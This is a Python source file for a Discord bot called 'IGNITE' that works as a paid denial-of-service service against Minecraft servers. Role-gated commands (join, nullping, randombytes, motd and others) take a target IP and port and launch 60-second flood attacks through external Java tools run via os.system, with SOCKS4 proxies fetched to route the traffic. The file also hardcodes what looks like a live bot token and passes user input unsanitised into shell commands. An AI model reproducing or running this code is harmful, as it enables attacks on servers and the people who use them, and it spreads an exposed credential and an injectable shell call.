import requests
from discord import Embed, File
from discord.ext import commands
import os
import discord

token = "ODgxNjQwODkyMzI1MzAyMzEy.YSvyEA.tk52n5fSudIRZrvEtpUrZMytAvw"

client = commands.Bot(command_prefix=';')
client.remove_command('help')

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.errors.CheckFailure):
        error2 = embed = Embed(title=f":fire: Error", description=f"Permission Denied !\n Please Purchase Plan", color=0xf250000)
        embed.set_footer(text="© IGNITE | :fire:")
        await ctx.channel.send(embed=error2)

@client.command()
async def help9510291025912041284(ctx):
    embed = discord.Embed(title=f"Methods List", description=f"\n For PrivateHUB Users (🦅 PrivateHUB) Please Use Commands Listed Below\n \n  ;Join IP Port Protocol! \n  ;DoubleJoin IP Port Protocol!\n  ;RandomBytes IP Port Protocol! \n  ;NullPing IP Port Protocol!\n ;Ping IP Port Protocol!\n ;Motd IP Port Protocol\n ;InvalidNames IP Port Protocol\n ;BotSentry IP Port Protocol\n \n ;Update Updates Current Proxies\n ;Resolve Domain")     
    embed.set_footer(text="© IGNITE | 🔥")
    await ctx.send(embed=embed)

@client.command()
async def update(ctx):
    f = open("proxies.txt", "a+")
    f.truncate(0)
    r = requests.get('https://api.openproxylist.xyz/socks4.txt')
    proxies = []
    for proxy in r.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        f.write((p)+"\n")
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"Socks4 Proxies has been successfully refreshed.")     
    embed.set_footer(text="© IGNITE | 🔥")
    await ctx.send(embed=embed)

    
@client.command()
@commands.has_role('🦅 PrivateHUB')
async def join (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: Join :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 250000")     
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    embed.set_footer(text="© IGNITE | 🔥")
    await ctx.send(embed=embed)
    cmd = f"screen -dmS OVH java -jar MCBOT.Jar {arg1}:{arg2} {arg3} join 60 250000"
    cmd2 = f"screen -dmS OVH java -jar MCBOT.Jar {arg1}:{arg2} {arg3} join 60 250000"
    os.system(cmd)
    os.system(cmd2) 

@client.command()
@commands.has_role('🦅 PrivateHUB')
async def randombytes (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: RandomBytes :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 250000")     
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    embed.set_footer(text="© IGNITE | 🔥")
    await ctx.send(embed=embed)
    cmd = f"screen -dmS OVH java -jar MCBOT.Jar {arg1}:{arg2} {arg3} randombytes 60 250000"
    cmd2 = f"screen -dmS OVH java -jar MCBOT.Jar {arg1}:{arg2} {arg3} randombytes 60 250000"
    os.system(cmd)
    os.system(cmd2)
    
@client.command()
@commands.has_role('🦅 PrivateHUB')
async def nullping (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: NullPing :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 250000")     
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    embed.set_footer(text="© IGNITE | 🔥")
    await ctx.send(embed=embed)
    cmd = f"screen -dmS OVH java -jar MCBOT.Jar {arg1}:{arg2} {arg3} nullping 60 250000"
    cmd2 = f"screen -dmS OVH java -jar MCBOT.Jar {arg1}:{arg2} {arg3} nullping 60 250000"
    os.system(cmd)
    os.system(cmd2)
    
@client.command()
@commands.has_role('🦅 PrivateHUB')
async def doublejoin (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: DoubleJoin :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 250000")    
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    embed.set_footer(text="© IGNITE | 🔥")
    await ctx.send(embed=embed)
    cmd = f"screen -dmS OVH java -jar MCBOT.Jar {arg1}:{arg2} {arg3} doublejoin 60 250000"
    cmd2 = f"screen -dmS OVH java -jar MCBOT.Jar {arg1}:{arg2} {arg3} doublejoin 60 250000"
    os.system(cmd)
    os.system(cmd2)
    
@client.command()
@commands.has_role('🦅 PrivateHUB')
async def ping (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: Ping :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 250000")    
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    embed.set_footer(text="© IGNITE | 🔥")
    await ctx.send(embed=embed)
    cmd = f"screen -dmS OVH java -jar MCBOT.Jar {arg1}:{arg2} {arg3} ping 60 250000"
    cmd2 = f"screen -dmS OVH java -jar MCBOT.Jar {arg1}:{arg2} {arg3} ping 60 250000"
    os.system(cmd)
    os.system(cmd2)
    
@client.command()
@commands.has_role('🦅 PrivateHUB')
async def motd (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: Motd :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 250000")    
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    embed.set_footer(text="© IGNITE | 🔥")
    await ctx.send(embed=embed)
    cmd = "screen -dmS OVH java -Dperdelay=2500000 -Ddelay=0 -jar motd.jar " + str(arg1) +":"+ str(arg2) + " 1 250 " + str(arg3) + " 60 proxies.txt socks4"
    cmd2 = "screen -dmS OVH java -Dperdelay=2500000 -Ddelay=0 -jar motd.jar " + str(arg1) +":"+ str(arg2) + " 1 250 " + str(arg3) + " 60 proxies.txt socks4"
    os.system(cmd)
    os.system(cmd2)

@client.command()
@commands.has_role('☘️ Member +')
async def invalidnames (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: InvalidNames :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 250000")    
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    embed.set_footer(text="© IGNITE | 🔥")
    await ctx.send(embed=embed)
    cmd = f"screen -dmS OVH java -jar MCBOT.Jar {arg1}:{arg2} {arg3} invalidnames 60 250000"
    cmd2 = f"screen -dmS OVH java -jar MCBOT.Jar {arg1}:{arg2} {arg3} invalidnames 60 250000"
    os.system(cmd) 
    os.system(cmd2)  

@client.command()
@commands.has_role('☘️ Member')
async def botsentry (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: BotSentry :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 60 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 250000")    
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    embed.set_footer(text="© IGNITE | 🔥")
    await ctx.send(embed=embed)
    cmd = f"screen -dmS OVH java -jar MCBOT.Jar {arg1}:{arg2} {arg3} botjoiner 60 250000"
    cmd2 = f"screen -dmS OVH java -jar MCBOT.Jar {arg1}:{arg2} {arg3} botjoiner 60 250000"
    
    os.system(cmd)     
    
client.run(token)